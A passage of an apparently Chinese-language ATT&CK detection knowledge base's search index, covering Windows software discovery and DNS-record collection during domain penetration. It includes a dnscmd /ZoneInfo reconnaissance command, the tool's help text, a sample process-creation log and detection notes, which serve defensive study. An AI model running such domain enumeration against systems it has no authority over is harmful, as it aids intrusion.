\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_1","text":"\u6682\u65e0\uff0c\u6839\u636eMITRE ATT&CK\u77e9\u9635\u56fe\u4ecb\u7ecd\uff0c\u4f7f\u7528\u6b64\u6280\u6218\u672f\u7684\u7ec4\u7ec7\u8f83\u5c11\uff0c\u6545\u4e0d\u4f5c\u8be6\u7ec6\u6d4b\u8bd5\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_2","text":"Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_3","text":"\u6682\u65e0\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_4","text":"\u6682\u65e0\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#sigma","text":"\u6682\u65e0\uff0c\u53ef\u53c2\u8003T1057-win-\u8fdb\u7a0b\u53d1\u73b0","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_6","text":"\u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1518-001-win-%E8%BD%AF%E4%BB%B6%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1518 https://attack.mitre.org/techniques/T1518/ MITRE-ATT&CK-T1057 https://attack.mitre.org/techniques/T1057/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/","text":"T1590-win-DNS\u8bb0\u5f55\u83b7\u53d6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u653b\u51fb\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005DNS\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u5728\u76ee\u6807\u786e\u5b9a\u671f\u95f4\u4f7f\u7528\u3002 \u5728\u57df\u6e17\u900f\u4e2d\uff0c\u5bf9\u57df\u73af\u5883\u7684\u4fe1\u606f\u641c\u96c6\u5f88\u5173\u952e\uff0c\u5982\u679c\u6211\u4eec\u83b7\u5f97\u4e86\u57df\u5185\u7ba1\u7406\u5458\u7684\u6743\u9650\uff0c\u90a3\u4e48\u5982\u4f55\u80fd\u591f\u5feb\u901f\u4e86\u89e3\u57df\u5185\u7684\u7f51\u7edc\u67b6\u6784\u5462\uff1fDNS\u8bb0\u5f55\u65e0\u7591\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u53c2\u8003\u3002 \u6d4b\u8bd5\u6848\u4f8b \u672c\u6587\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a \u901a\u8fc7dnscmd\u83b7\u53d6DNS\u8bb0\u5f55 dnscmd\uff1a\u7528\u6765\u7ba1\u7406DNS\u670d\u52a1\u5668\u7684\u547d\u4ee4\u884c\u63a5\u53e3\uff0c\u652f\u6301\u8fdc\u7a0b\u8fde\u63a5 \u9ed8\u8ba4\u5b89\u88c5\u7684\u7cfb\u7edf\uff1a Windows Server 2003 Windows Server 2008 Windows Server 2003 R2 Windows Server 2008 R2 Windows Server 2012 Windows Server 2003 with SP1 \u2026 \u53c2\u8003\u8d44\u6599\uff1a https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc772069(v=ws.11) Win7\u7cfb\u7edf\u5728\u4f7f\u7528\u65f6\u9700\u8981\u5b89\u88c5Remote Server Administration Tools (RSAT) \u53c2\u8003\u5730\u5740\uff1a https://support.microsoft.com/en-us/help/2693643/remote-server-administration-tools-rsat-for-windows-operating-systems RSAT\u4e0b\u8f7d\u5730\u5740\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=7887 \u68c0\u6d4b\u65e5\u5fd7 Windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u5e38\u7528\u547d\u4ee4 \u672a\u80fd\u5b9e\u73b0\u4e09\u597d\u5b66\u751f\u5927\u4f6c\u8bf4\u7684\u6548\u679c\uff0c\u540c\u6837\u6211\u7684Windows server 2008R2\u5e76\u4e0d\u652f\u6301dnscmd\u8fd9\u4e2a\u547d\u4ee4\u3002\u5f88\u65e0\u5948\u3002\u5728Windows server 2016\u4e2d\u5e76\u6ca1\u6709\".\"\uff0c\u503c\u5f97\u6ce8\u610f\u3002 C:\\Users\\12306br0>dnscmd ./ZoneInfo 361a.com \u6307\u5b9a\u4e86\u672a\u77e5\u7684\u547d\u4ee4\u201c361a.com\u201d -- \u952e\u5165 DnsCmd -?\u3002 \u5728\u5c06\u6765\u7684 Windows \u7248\u672c\u4e2d\uff0cMicrosoft \u53ef\u80fd\u4f1a\u5220\u9664 dnscmd.exe\u3002 \u5982\u679c\u4f60\u5f53\u524d\u4f7f\u7528 dnscmd.exe \u914d\u7f6e\u548c\u7ba1\u7406 DNS \u670d\u52a1\u5668\uff0c Microsoft \u5efa\u8bae\u4f60\u8fc7\u6e21\u5230 Windows PowerShell\u3002 \u82e5\u8981\u67e5\u770b DNS \u670d\u52a1\u5668\u7ba1\u7406\u547d\u4ee4\u5217\u8868\uff0c\u8bf7\u5728 Windows PowerShell \u63d0\u793a\u7b26\u5904\u952e\u5165 \"Get-Command -Module DnsServer\"\u3002 \u6709\u5173\u9002\u7528\u4e8e DNS \u7684 Windows PowerShell \u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 http://go.microsoft.com/fwlink/?LinkId=217627\u3002 \u7528\u6cd5: DnsCmd <ServerName> <Command> [<Command Parameters>] <ServerName>: IP \u5730\u5740\u6216\u4e3b\u673a\u540d -- \u8fdc\u7a0b\u6216\u672c\u5730 DNS \u670d\u52a1\u5668\u3002 . -- \u672c\u5730\u8ba1\u7b97\u673a\u4e0a\u7684 DNS \u670d\u52a1\u5668 <Command>: /Info -- \u83b7\u53d6\u670d\u52a1\u5668\u4fe1\u606f /Config -- \u91cd\u7f6e\u670d\u52a1\u5668\u6216\u533a\u57df\u914d\u7f6e /EnumZones -- \u679a\u4e3e\u533a\u57df /Statistics -- \u67e5\u8be2/\u6e05\u9664\u670d\u52a1\u5668\u7edf\u8ba1\u4fe1\u606f\u6570\u636e /ClearCache -- \u6e05\u9664 DNS \u670d\u52a1\u5668\u7f13\u5b58 /WriteBackFiles -- \u5199\u5165\u6240\u6709\u533a\u57df\u6216\u6839\u63d0\u793a\u6570\u636e\u6587\u4ef6 /StartScavenging -- \u5f00\u59cb\u670d\u52a1\u5668\u6e05\u7406 /IpValidate -- \u9a8c\u8bc1\u8fdc\u7a0b DNS \u670d\u52a1\u5668 /EnumKSPs -- \u679a\u4e3e\u53ef\u7528\u7684\u5bc6\u94a5\u5b58\u50a8\u63d0\u4f9b\u7a0b\u5e8f /ResetListenAddresses -- \u5c06\u670d\u52a1\u5668 IP \u5730\u5740\u8bbe\u7f6e\u4e3a\u670d\u52a1 DNS \u8bf7\u6c42 /ResetForwarders -- \u5c06 DNS \u670d\u52a1\u5668\u8bbe\u7f6e\u4e3a\u8f6c\u53d1\u9012\u5f52\u67e5\u8be2 /ZoneInfo -- \u67e5\u770b\u533a\u57df\u4fe1\u606f /ZoneAdd -- \u5728 DNS \u670d\u52a1\u5668\u4e0a\u521b\u5efa\u65b0\u533a\u57df /ZoneDelete -- \u4ece DNS \u670d\u52a1\u5668\u6216 DS \u5220\u9664\u533a\u57df /ZonePause -- \u6682\u505c\u533a\u57df /ZoneResume -- \u6062\u590d\u533a\u57df /ZoneReload -- \u4ece\u5176\u6570\u636e\u5e93(\u6587\u4ef6\u6216 DS)\u91cd\u65b0\u52a0\u8f7d\u533a\u57df /ZoneWriteBack -- \u5c06\u533a\u57df\u5199\u56de\u5230\u6587\u4ef6 /ZoneRefresh -- \u5f3a\u5236\u5237\u65b0\u4e3b\u673a\u7684\u8f85\u52a9\u533a\u57df /ZoneUpdateFromDs -- \u4f7f\u7528\u6765\u81ea DS \u7684\u6570\u636e\u66f4\u65b0 DS \u96c6\u6210\u533a\u57df /ZonePrint -- \u663e\u793a\u533a\u57df\u4e2d\u7684\u6240\u6709\u8bb0\u5f55 /ZoneResetType -- \u66f4\u6539\u533a\u57df\u7c7b\u578b /ZoneResetSecondaries -- \u91cd\u7f6e\u533a\u57df\u7684\u8f85\u52a9\\\u901a\u77e5\u4fe1\u606f /ZoneResetScavengeServers -- \u91cd\u7f6e\u533a\u57df\u7684\u6e05\u7406\u670d\u52a1\u5668 /ZoneResetMasters -- \u91cd\u7f6e\u8f85\u52a9\u533a\u57df\u7684\u4e3b\u670d\u52a1\u5668 /ZoneExport -- \u5c06\u533a\u57df\u5bfc\u51fa\u5230\u6587\u4ef6 /ZoneChangeDirectoryPartition -- \u5c06\u533a\u57df\u79fb\u52a8\u5230\u53e6\u4e00\u76ee\u5f55\u5206\u533a /ZoneSeizeKeymasterRole -- \u5360\u7528\u533a\u57df\u7684\u5bc6\u94a5\u4e3b\u673a\u89d2\u8272 /ZoneTransferKeymasterRole -- \u4f20\u9001\u533a\u57df\u7684\u5bc6\u94a5\u4e3b\u673a\u89d2\u8272 /ZoneEnumSKDs -- \u679a\u4e3e\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26 /ZoneAddSKD -- \u4e3a\u533a\u57df\u521b\u5efa\u65b0\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26 /ZoneDeleteSKD -- \u5220\u9664\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26 /ZoneModifySKD -- \u4fee\u6539\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26 /ZoneValidateSigningParameters -- \u9a8c\u8bc1\u533a\u57df\u7684 DNSSEC \u8054\u673a\u7b7e\u540d\u53c2\u6570 /ZoneSetSKDState -- \u4e3a\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u8bbe\u7f6e\u6d3b\u52a8\u548c/\u6216\u5f85\u673a\u5bc6\u94a5 /ZoneGetSKDState -- \u68c0\u7d22\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u7684\u52a8\u6001\u72b6\u6001 /ZonePerformKeyRollover -- \u5728\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u4e2d\u89e6\u53d1\u5bc6\u94a5\u6eda\u52a8\u66f4\u65b0 /ZonePokeKeyRollover -- \u5728\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26\u4e2d\u89e6\u53d1\u5bc6\u94a5\u6eda\u52a8\u66f4\u65b0 /ZoneSign -- \u4f7f\u7528 DNSSEC \u8054\u673a\u7b7e\u540d\u53c2\u6570\u4e3a\u533a\u57df\u7b7e\u540d /ZoneUnsign -- \u4ece\u5df2\u7b7e\u540d\u7684\u533a\u57df\u4e2d\u5220\u9664 DNSSEC \u7b7e\u540d /ZoneResign -- \u5728\u5df2\u7b7e\u540d\u7684\u533a\u57df\u4e2d\u91cd\u65b0\u751f\u6210 DNSSEC \u7b7e\u540d /EnumRecords -- \u679a\u4e3e\u540c\u4e00\u540d\u79f0\u7684\u8bb0\u5f55 /RecordAdd -- \u5728\u533a\u57df\u6216\u6839\u63d0\u793a\u4e2d\u521b\u5efa\u8bb0\u5f55 /RecordDelete -- \u4ece\u533a\u57df\u3001\u6839\u63d0\u793a\u6216\u7f13\u5b58\u4e2d\u5220\u9664\u8bb0\u5f55 /NodeDelete -- \u5220\u9664\u540c\u4e00\u540d\u79f0\u7684\u6240\u6709\u8bb0\u5f55 /AgeAllRecords -- \u5bf9\u533a\u57df\u4e2d\u7684\u8282\u70b9\u8fdb\u884c\u5f3a\u5236\u8001\u5316 /TrustAnchorAdd -- \u5728 DNS \u670d\u52a1\u5668\u4e0a\u521b\u5efa\u65b0\u7684\u4fe1\u4efb\u5bc6\u94a5\u533a\u57df /TrustAnchorDelete -- \u4ece DNS \u670d\u52a1\u5668\u6216 DS \u5220\u9664\u4fe1\u4efb\u5bc6\u94a5\u533a\u57df /EnumTrustAnchors -- \u663e\u793a\u4fe1\u4efb\u5b9a\u4f4d\u70b9\u7684\u72b6\u6001\u4fe1\u606f /TrustAnchorsResetType -- \u66f4\u6539\u4fe1\u4efb\u5bc6\u94a5\u533a\u57df\u7684\u533a\u57df\u7c7b\u578b /EnumDirectoryPartitions -- \u679a\u4e3e\u76ee\u5f55\u5206\u533a /DirectoryPartitionInfo -- \u83b7\u53d6\u6709\u5173\u76ee\u5f55\u5206\u533a\u7684\u4fe1\u606f /CreateDirectoryPartition -- \u521b\u5efa\u76ee\u5f55\u5206\u533a /DeleteDirectoryPartition -- \u5220\u9664\u76ee\u5f55\u5206\u533a /EnlistDirectoryPartition -- \u5c06 DNS \u670d\u52a1\u5668\u6dfb\u52a0\u5230\u5206\u533a\u590d\u5236\u4f5c\u7528\u57df /UnenlistDirectoryPartition -- \u4ece\u590d\u5236\u4f5c\u7528\u57df\u4e2d\u5220\u9664 DNS \u670d\u52a1\u5668 /CreateBuiltinDirectoryPartitions -- \u521b\u5efa\u5185\u7f6e\u5206\u533a /ExportSettings -- \u5c06\u8bbe\u7f6e\u8f93\u51fa\u5230 DNS \u670d\u52a1\u5668\u6570\u636e\u5e93\u76ee\u5f55\u4e2d\u7684 DnsSettings.txt /OfflineSign -- \u8131\u673a\u7b7e\u540d\u533a\u57df\u6587\u4ef6\uff0c\u5305\u62ec\u5bc6\u94a5\u751f\u6210/\u5220\u9664 /EnumTrustPoints -- \u663e\u793a\u6240\u6709\u4fe1\u4efb\u70b9\u7684\u6709\u6548\u5237\u65b0\u4fe1\u606f /ActiveRefreshAllTrustPoints -- \u7acb\u5373\u5bf9\u6240\u6709\u4fe1\u4efb\u70b9\u6267\u884c\u6709\u6548\u5237\u65b0 /RetrieveRootTrustAnchors -- \u901a\u8fc7 HTTPS \u68c0\u7d22\u6839\u4fe1\u4efb\u5b9a\u4f4d\u70b9 <Command Parameters>: DnsCmd <CommandName> /? -- \u6709\u5173\u7279\u5b9a\u547d\u4ee4\u7684\u5e2e\u52a9\u4fe1\u606f \u5728\u5c06\u6765\u7684 Windows \u7248\u672c\u4e2d\uff0cMicrosoft \u53ef\u80fd\u4f1a\u5220\u9664 dnscmd.exe\u3002 \u5982\u679c\u4f60\u5f53\u524d\u4f7f\u7528 dnscmd.exe \u914d\u7f6e\u548c\u7ba1\u7406 DNS \u670d\u52a1\u5668\uff0c Microsoft \u5efa\u8bae\u4f60\u8fc7\u6e21\u5230 Windows PowerShell\u3002 \u82e5\u8981\u67e5\u770b DNS \u670d\u52a1\u5668\u7ba1\u7406\u547d\u4ee4\u5217\u8868\uff0c\u8bf7\u5728 Windows PowerShell \u63d0\u793a\u7b26\u5904\u952e\u5165 \"Get-Command -Module DnsServer\"\u3002 \u6709\u5173\u9002\u7528\u4e8e DNS \u7684 Windows PowerShell \u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 http://go.microsoft.com/fwlink/?LinkId=217627\u3002 \u6d4b\u8bd5\u7559\u75d5 \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x36D7FD \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x111c \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\dnscmd.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0xb40 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: dnscmd /ZoneInfo 361a.com \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u5efa\u8bae \u6700\u7b80\u5355\u7684\u529e\u6cd5\u5c31\u662f\u68c0\u6d4b\u76f8\u5173\u547d\u4ee4\u884c\u53ca\u8fdb\u7a0b\uff0c\u4f46\u8fd9\u4f3c\u4e4e\u4e0d\u662f\u5f88\u9760\u8c31\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1590 https://attack.mitre.org/techniques/T1590/ \u57df\u6e17\u900f\u2014\u2014DNS\u8bb0\u5f55\u7684\u83b7\u53d6 https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96","title":"T1590-win-DNS\u8bb0\u5f55\u83b7\u53d6"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#t1590-win-dns","text":"","title":"T1590-win-DNS\u8bb0\u5f55\u83b7\u53d6"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#attck","text":"\u5728\u653b\u51fb\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005DNS\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u5728\u76ee\u6807\u786e\u5b9a\u671f\u95f4\u4f7f\u7528\u3002 \u5728\u57df\u6e17\u900f\u4e2d\uff0c\u5bf9\u57df\u73af\u5883\u7684\u4fe1\u606f\u641c\u96c6\u5f88\u5173\u952e\uff0c\u5982\u679c\u6211\u4eec\u83b7\u5f97\u4e86\u57df\u5185\u7ba1\u7406\u5458\u7684\u6743\u9650\uff0c\u90a3\u4e48\u5982\u4f55\u80fd\u591f\u5feb\u901f\u4e86\u89e3\u57df\u5185\u7684\u7f51\u7edc\u67b6\u6784\u5462\uff1fDNS\u8bb0\u5f55\u65e0\u7591\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u53c2\u8003\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_1","text":"\u672c\u6587\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a \u901a\u8fc7dnscmd\u83b7\u53d6DNS\u8bb0\u5f55 dnscmd\uff1a\u7528\u6765\u7ba1\u7406DNS\u670d\u52a1\u5668\u7684\u547d\u4ee4\u884c\u63a5\u53e3\uff0c\u652f\u6301\u8fdc\u7a0b\u8fde\u63a5 \u9ed8\u8ba4\u5b89\u88c5\u7684\u7cfb\u7edf\uff1a Windows Server 2003 Windows Server 2008 Windows Server 2003 R2 Windows Server 2008 R2 Windows Server 2012 Windows Server 2003 with SP1 \u2026 \u53c2\u8003\u8d44\u6599\uff1a https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc772069(v=ws.11) Win7\u7cfb\u7edf\u5728\u4f7f\u7528\u65f6\u9700\u8981\u5b89\u88c5Remote Server Administration Tools (RSAT) \u53c2\u8003\u5730\u5740\uff1a https://support.microsoft.com/en-us/help/2693643/remote-server-administration-tools-rsat-for-windows-operating-systems RSAT\u4e0b\u8f7d\u5730\u5740\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=7887","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_2","text":"Windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1590-win-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96/#_4","text":"\u672a\u80fd\u5b9e\u73b0\u4e09\u597d\u5b66\u751f\u5927\u4f6c\u8bf4\u7684\u6548\u679c\uff0c\u540c\u6837\u6211\u7684Windows server 2008R2\u5e76\u4e0d\u652f\u6301dnscmd\u8fd9\u4e2a\u547d\u4ee4\u3002\u5f88\u65e0\u5948\u3002\u5728Windows server 2016\u4e2d\u5e76\u6ca1\u6709\".\"\uff0c\u503c\u5f97\u6ce8\u610f\u3002 C:\\Users\\12306br0>dnscmd ./ZoneInfo 361a.com \u6307\u5b9a\u4e86\u672a\u77e5\u7684\u547d\u4ee4\u201c361a.com\u201d -- \u952e\u5165 DnsCmd -?\u3002 \u5728\u5c06\u6765\u7684 Windows \u7248\u672c\u4e2d\uff0cMicrosoft \u53ef\u80fd\u4f1a\u5220\u9664 dnscmd.exe\u3002 \u5982\u679c\u4f60\u5f53\u524d\u4f7f\u7528 dnscmd.exe \u914d\u7f6e\u548c\u7ba1\u7406 DNS \u670d\u52a1\u5668\uff0c Microsoft \u5efa\u8bae\u4f60\u8fc7\u6e21\u5230 Windows PowerShell\u3002 \u82e5\u8981\u67e5\u770b DNS \u670d\u52a1\u5668\u7ba1\u7406\u547d\u4ee4\u5217\u8868\uff0c\u8bf7\u5728 Windows PowerShell \u63d0\u793a\u7b26\u5904\u952e\u5165 \"Get-Command -Module DnsServer\"\u3002 \u6709\u5173\u9002\u7528\u4e8e DNS \u7684 Windows PowerShell \u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 http://go.microsoft.com/fwlink/?LinkId=217627\u3002 \u7528\u6cd5: DnsCmd <ServerName> <Command> [<Command Parameters>] <ServerName>: IP \u5730\u5740\u6216\u4e3b\u673a\u540d -- \u8fdc\u7a0b\u6216\u672c\u5730 DNS \u670d\u52a1\u5668\u3002 . -- \u672c\u5730\u8ba1\u7b97\u673a\u4e0a\u7684 DNS \u670d\u52a1\u5668 <Command>: /Info -- \u83b7\u53d6\u670d\u52a1\u5668\u4fe1\u606f /Config -- \u91cd\u7f6e\u670d\u52a1\u5668\u6216\u533a\u57df\u914d\u7f6e /EnumZones -- \u679a\u4e3e\u533a\u57df /Statistics -- \u67e5\u8be2/\u6e05\u9664\u670d\u52a1\u5668\u7edf\u8ba1\u4fe1\u606f\u6570\u636e /ClearCache -- \u6e05\u9664 DNS \u670d\u52a1\u5668\u7f13\u5b58 /WriteBackFiles -- \u5199\u5165\u6240\u6709\u533a\u57df\u6216\u6839\u63d0\u793a\u6570\u636e\u6587\u4ef6 /StartScavenging -- \u5f00\u59cb\u670d\u52a1\u5668\u6e05\u7406 /IpValidate -- \u9a8c\u8bc1\u8fdc\u7a0b DNS \u670d\u52a1\u5668 /EnumKSPs -- \u679a\u4e3e\u53ef\u7528\u7684\u5bc6\u94a5\u5b58\u50a8\u63d0\u4f9b\u7a0b\u5e8f /ResetListenAddresses -- \u5c06\u670d\u52a1\u5668 IP \u5730\u5740\u8bbe\u7f6e\u4e3a\u670d\u52a1 DNS \u8bf7\u6c42 /ResetForwarders -- \u5c06 DNS \u670d\u52a1\u5668\u8bbe\u7f6e\u4e3a\u8f6c\u53d1\u9012\u5f52\u67e5\u8be2 /ZoneInfo -- \u67e5\u770b\u533a\u57df\u4fe1\u606f /ZoneAdd -- \u5728 DNS \u670d\u52a1\u5668\u4e0a\u521b\u5efa\u65b0\u533a\u57df /ZoneDelete -- \u4ece DNS \u670d\u52a1\u5668\u6216 DS \u5220\u9664\u533a\u57df /ZonePause -- \u6682\u505c\u533a\u57df /ZoneResume -- \u6062\u590d\u533a\u57df /ZoneReload -- \u4ece\u5176\u6570\u636e\u5e93(\u6587\u4ef6\u6216 DS)\u91cd\u65b0\u52a0\u8f7d\u533a\u57df /ZoneWriteBack -- \u5c06\u533a\u57df\u5199\u56de\u5230\u6587\u4ef6 /ZoneRefresh -- \u5f3a\u5236\u5237\u65b0\u4e3b\u673a\u7684\u8f85\u52a9\u533a\u57df /ZoneUpdateFromDs -- \u4f7f\u7528\u6765\u81ea DS \u7684\u6570\u636e\u66f4\u65b0 DS \u96c6\u6210\u533a\u57df /ZonePrint -- \u663e\u793a\u533a\u57df\u4e2d\u7684\u6240\u6709\u8bb0\u5f55 /ZoneResetType -- \u66f4\u6539\u533a\u57df\u7c7b\u578b /ZoneResetSecondaries -- \u91cd\u7f6e\u533a\u57df\u7684\u8f85\u52a9\\\u901a\u77e5\u4fe1\u606f /ZoneResetScavengeServers -- \u91cd\u7f6e\u533a\u57df\u7684\u6e05\u7406\u670d\u52a1\u5668 /ZoneResetMasters -- \u91cd\u7f6e\u8f85\u52a9\u533a\u57df\u7684\u4e3b\u670d\u52a1\u5668 /ZoneExport -- \u5c06\u533a\u57df\u5bfc\u51fa\u5230\u6587\u4ef6 /ZoneChangeDirectoryPartition -- \u5c06\u533a\u57df\u79fb\u52a8\u5230\u53e6\u4e00\u76ee\u5f55\u5206\u533a /ZoneSeizeKeymasterRole -- \u5360\u7528\u533a\u57df\u7684\u5bc6\u94a5\u4e3b\u673a\u89d2\u8272 /ZoneTransferKeymasterRole -- \u4f20\u9001\u533a\u57df\u7684\u5bc6\u94a5\u4e3b\u673a\u89d2\u8272 /ZoneEnumSKDs -- \u679a\u4e3e\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26 /ZoneAddSKD -- \u4e3a\u533a\u57df\u521b\u5efa\u65b0\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26 /ZoneDeleteSKD -- \u5220\u9664\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26 /ZoneModifySKD -- \u4fee\u6539\u533a\u57df\u7684\u7b7e\u540d\u5bc6\u94a5\u63cf\u8ff0\u7b26 /ZoneValidateSigningParameters -- \u9a8c\u8bc1\u533a\u57df\u7684 DNSSEC \u8054\u673a\u7b7e\u540d\u53c2\u6570 /ZoneSetSKDState -- 